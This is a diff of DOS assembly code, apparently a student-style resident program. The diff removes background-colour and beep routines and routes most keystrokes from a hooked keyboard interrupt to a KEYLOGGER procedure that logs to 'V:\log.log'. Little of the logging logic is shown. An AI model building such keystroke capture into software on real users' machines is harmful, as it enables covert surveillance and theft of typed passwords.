@@ -20,9 +20,8 @@ BEGIN:  JMP             START
         FILE            DB    'V:\log.log', 0
         EXCEPT          DB    8, 26, 27, 0
 
-        SCREEN_SAVER    DB    0
-        SCREEN_OFF      DB    0
-        COLOR           DB    0
+        SCREEN_SAVER    DB    1
+        SCREEN_OFF      DB    1
 
 
 KB      PROC
@@ -38,87 +37,31 @@ KB      PROC
         MOV             BX,  DS:[1CH]
         IN              AL,  60H
         TEST            AL,  80H 
-        JNZ             @@11        
+        JNZ             @@5        
+
 
         CMP             AL, 62 
-        JZ              @@1
+        JNZ             @@4
+        CALL            SCREEN_OFF_INVERT
+        JMP             @@5
 
-        CMP             AL, 63 
-        JZ              @@2
 
-        CMP             AL, 64         
-        JZ              @@3
+;        CMP             AL, 62 
+;        JNZ             @@4
+;        CALL            SCREEN_SAVER_INVERT
+;        JMP             @@5
 
-        CMP             AL, 65 
-        JZ              @@4
 
-        CMP             AL, 66 
-        JZ              @@12
 
-        CMP             CS:COLOR, 0
-        JZ              @@0     
+@@4:    CALL            KEYLOGGER
 
-        CMP             AL, 48
-        JZ              @@5
-        
-        CMP             AL, 34 
-        JZ              @@6 
-
-        CMP             AL, 25 
-        JZ              @@7 
-
-        CMP             AL, 46 
-        JZ              @@8 
-
-        CMP             AL, 19 
-        JZ              @@9 
-        
-        CMP             AL, 21 
-        JZ              @@10              
-
-@@0:    CALL            KEYLOGGER
-        JMP             @@11
-
-@@1:    CALL            SCREEN_OFF_INVERT
-        JMP             @@11
-
-@@2:    CALL            SCREEN_SAVER_INVERT
-        JMP             @@11
-
-@@3:    CALL            CHANGE_BACKGROUND_DEFAULT
-        JMP             @@11
-
-@@4:    CALL            SIGNAL
-        JMP             @@11
-
-@@5:    CALL            CHANGE_BACKGROUND_BLUE
-        JMP             @@0
-
-@@6:    CALL            CHANGE_BACKGROUND_GREEN
-        JMP             @@0
-
-@@7:    CALL            CHANGE_BACKGROUND_PURPURE
-        JMP             @@0
-
-@@8:    CALL            CHANGE_BACKGROUND_CYAN
-        JMP             @@0
-
-@@9:    CALL            CHANGE_BACKGROUND_RED
-        JMP             @@0
-
-@@10:    CALL            CHANGE_BACKGROUND_YELLOW
-        JMP             @@0
-
-@@12:   CALL            COLOR_INVERT
-        JMP             @@11
-
-@@11:   POPA    
+@@5:    POPA    
         POP             DS
         IRET
 KB      ENDP
 
 
-KEYLOGGER PROC
+KEYLOGGER PROC SCAN_CODE:BYTE
         DEC             BX
         DEC             BX
         CMP             BX,  1EH
@@ -179,166 +122,6 @@ KEYLOGGER PROC
 KEYLOGGER ENDP
 
 
-CHANGE_BACKGROUND_BLUE PROC
-        PUSHA
-        
-        MOV             DX, 3C8H
-        MOV             AL, 0
-        OUT             DX, AL
-
-        INC             DX
-
-        MOV             AL, 0
-        OUT             DX, AL
-
-        MOV             AL, 0
-        OUT             DX, AL
-
-        MOV             AL, 42
-        OUT             DX, AL
-        
-        POPA
-        RET
-CHANGE_BACKGROUND_BLUE ENDP
-
-
-CHANGE_BACKGROUND_GREEN PROC
-        PUSHA
-        
-        MOV             DX, 3C8H
-        MOV             AL, 0
-        OUT             DX, AL
-
-        INC             DX
-
-        MOV             AL, 0
-        OUT             DX, AL
-
-        MOV             AL, 42
-        OUT             DX, AL
-
-        MOV             AL, 0
-        OUT             DX, AL
-        
-        POPA
-        RET
-CHANGE_BACKGROUND_GREEN ENDP
-
-
-CHANGE_BACKGROUND_PURPURE PROC
-        PUSHA
-        
-        MOV             DX, 3C8H
-        MOV             AL, 0
-        OUT             DX, AL
-
-        INC             DX
-
-        MOV             AL, 42
-        OUT             DX, AL
-
-        MOV             AL, 0
-        OUT             DX, AL
-
-        MOV             AL, 42
-        OUT             DX, AL
-        
-        POPA
-        RET
-CHANGE_BACKGROUND_PURPURE ENDP
-
-
-CHANGE_BACKGROUND_CYAN PROC
-        PUSHA
-        
-        MOV             DX, 3C8H
-        MOV             AL, 0
-        OUT             DX, AL
-
-        INC             DX
-
-        MOV             AL, 0
-        OUT             DX, AL
-
-        MOV             AL, 42
-        OUT             DX, AL
-
-        MOV             AL, 42
-        OUT             DX, AL
-        
-        POPA
-        RET
-CHANGE_BACKGROUND_CYAN ENDP
-
-
-CHANGE_BACKGROUND_RED PROC
-        PUSHA
-        
-        MOV             DX, 3C8H
-        MOV             AL, 0
-        OUT             DX, AL
-
-        INC             DX
-
-        MOV             AL, 42
-        OUT             DX, AL
-
-        MOV             AL, 0
-        OUT             DX, AL
-
-        MOV             AL, 0
-        OUT             DX, AL
-        
-        POPA
-        RET
-CHANGE_BACKGROUND_RED ENDP
-
-
-CHANGE_BACKGROUND_YELLOW PROC
-        PUSHA
-        
-        MOV             DX, 3C8H
-        MOV             AL, 0
-        OUT             DX, AL
-
-        INC             DX
-
-        MOV             AL, 42
-        OUT             DX, AL
-
-        MOV             AL, 0
-        OUT             DX, AL
-
-        MOV             AL, 0
-        OUT             DX, AL
-        
-        POPA
-        RET
-CHANGE_BACKGROUND_YELLOW ENDP
-
-
-CHANGE_BACKGROUND_DEFAULT PROC
-        PUSHA
-        
-        MOV             DX, 3C8H
-        MOV             AL, 0
-        OUT             DX, AL
-
-        INC             DX
-        MOV             AL, 0
-        OUT             DX, AL
-
-        MOV             AL, 0
-        OUT             DX, AL
-
-        MOV             AL, 0
-        OUT             DX, AL
-        
-        POPA
-        RET
-CHANGE_BACKGROUND_DEFAULT ENDP
-
-
 SCREEN_SAVER_INVERT PROC
         PUSH AX
 
@@ -351,18 +134,6 @@ SCREEN_SAVER_INVERT PROC
 SCREEN_SAVER_INVERT ENDP
 
 
-COLOR_INVERT PROC
-        PUSH AX
-
-        MOV AL, CS:COLOR
-        XOR AL, 1
-        MOV CS:COLOR, AL
-
-        POP AX
-        RET
-COLOR_INVERT ENDP
-
-
 SCREEN_OFF_INVERT PROC
         PUSH AX
 
@@ -370,36 +141,11 @@ SCREEN_OFF_INVERT PROC
         XOR AL, 1
         MOV CS:SCREEN_OFF, AL
 
-        MOV CS:TIME, 48
+        MOV CS:TIME, 50
 
         POP AX
         RET
 SCREEN_OFF_INVERT ENDP
-
-
-SIGNAL PROC
-        PUSHA
-
-        MOV             AL, 10110110b
-        OUT             43h, AL
-        MOV             AL, 0Dh
-        OUT             42h, AL
-        MOV             AL, 11h
-        OUT             42h, AL
-        IN              AL, 11h
-        OR              AL, 00000011b
-        OUT             61h, AL
-        MOV             CX, 007h
-        MOV             DX, 0B500h
-        MOV             AH, 86h
-        INT             15h
-        IN              AL, 61h
-        AND             AL, 11111100b
-        OUT             61h, AL
-
-        POPA
-        RET
-SIGNAL ENDP
 
 CALC    PROC
         SHL             AL,   1
@@ -490,7 +236,7 @@ TIMER   PROC
         POP             DS
 
         CMP             SCREEN_OFF, 1
-        JZ              @@3
+        JZ             @@3
 
         CMP             SCREEN_SAVER, 1
         JNZ             @@4
@@ -699,6 +445,7 @@ ARGS    PROC
 @@3:    RET
 
 ARGS    ENDP
+
 
 CODE    ENDS
 
